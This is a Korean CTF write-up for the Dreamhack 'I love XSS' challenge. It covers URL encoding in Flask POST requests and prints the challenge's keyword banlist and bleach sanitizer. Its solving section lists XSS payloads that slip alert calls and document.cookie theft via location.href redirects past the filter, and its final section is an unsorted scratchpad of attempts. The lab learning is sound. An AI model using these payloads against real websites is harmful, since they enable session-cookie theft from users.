# Challenge: dreamhack - I love XSS

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/2061
서버 코드를 보니 이전 xss filtering 문제와 코드가 유사하지만 차이가 있다.

## 추가 학습
URL 인코딩과 http 요청과의 관계를 보기 위해 보다 조건이 약한 XSS-Filtering-Bypass 서버 코드를 돌려 봤다.

### 폼과 URL 인코딩-디코딩
* 폼을 POST로 전송할 때 body에 들어가는 값이 URL 인코딩되는가? Content-type에 따라 다르다.
* <form-method="POST"> 기본값은 applicaiton/x-www-form-urlencoded 이 경우 브라우저는 key=value&key2=value2 형태로 데이터를 만들고 특수문자, 공백, 비 ASCII 문자는 URL 인코딩 처리한다.
* 파일 업로드나 enctype="multipart/form-data"는 URL 인코딩 대신 multipart boundary 형식으로 보낸다. 파일, 텍스트, 바이너리를 그대로 포함 가능
* application/json 같은 경우 URL 인코딩 없이 JSON 문자열을 UTF-8 그대로 바디에 넣는다.
* burp suite로 POST request를 보자. 아래는 xss-filtering-bypass에서 다룬 예제이다."+"도 "%2B"로 바뀌는 걸 볼 수 있다.
* param=%3Cscrionpt%3Elocatioonn.href%3D%22%2Fmemo%3Fmemo%3D%22%2Bdocument.cookie%3C%2Fscrionpt%3E

### URL 디코딩은 언제하는가?
위와 같이 param이 인코딩되어 post request에 들어가도 flask에서 param=request.form.get("param")으로 받는 시점에서는 자동 디코딩된 값이 들어있다. 따라서 개발자가 따로 urllib.parse.unquote()할 필요가 없다. 
* HTTP 요청이 서버의 flask 라우트에 도달하면 WSGI 서버가 flask 요청 객체 request를 만들 때 url query string과 POST body를 자동 디코딩한다.
* 따라서 실습환경의 서버 코드에서 urllib.parse.quote()을 제거하면 url 부분에 인코딩안 안된 "+"가 들어가 공백으로 처리도리 수 있다. 


## 문제 풀이
step 1
* app.py 부분을 보면 아래 banlist의 필터링을 거치고 sanitizer에서도 살아남는 코드를 짜야 한다.
    ``` 
    banlist = [
    "`",
    "'",
    "alert(",
    "fetch(",
    "replace(",
    "[",
    "]",
    "javascript",
    "@",
    "!",
    "%",
    "location",
    "href",
    "window",
    "eval",
    ]
    ```
* sanitizer는 다음과 같다. 태그를 script로 한정하고 나머지 태그는 모두 제거한다. 또한 src, onclick 등 모든 속성을 차단하는 것을 알 수 있다. 또한 https, https만 허용하면서 javascript:와 같은 위험한 프로토콜을 차단한다.
    ```python
    import bleach

    ALLOWED_TAGS = ['script']   #I only love script tags!
    ALLOWED_ATTRIBUTES = {}
    ALLOWED_PROTOCOLS = ['http', 'https']

    def sanitize_input(user_input: str) -> str:
        return bleach.clean(
            user_input,
            tags=ALLOWED_TAGS,
            attributes=ALLOWED_ATTRIBUTES,
            protocols=ALLOWED_PROTOCOLS,
            strip=True,
            strip_comments=True
        )
    ```
* 따라서 script 태그를 이용해 banlist를 잘 우회해내면 된다. 주의할 점은 이전의 문제들과 달리 urllib.parse.quote() 부분이 없어 우회 시 인코딩 부분도 더 고려해야 한다는 점이다.


플래그를 얻으려면 /flag에 요청을 보내야 한다.
/flag?answer=<script></script>

/flag?answer=<script>\\u0061lert(document.cookie)</script>
안된다.



## 결과

http://host8.dreamhack.games:21278/flag?answer=%3Cscript%3Eal%20ert(FLAG)%3C/script%3E


/flag?answer=<script>al\u0065rt(document.cookie)</script>

&lpar;



/flag?answer=<script>alert&lpar;document.cookie)</script>


<script>location.href="test?payload="+document.cookie;</script>

 location.href="/test?payload="+document.cookie

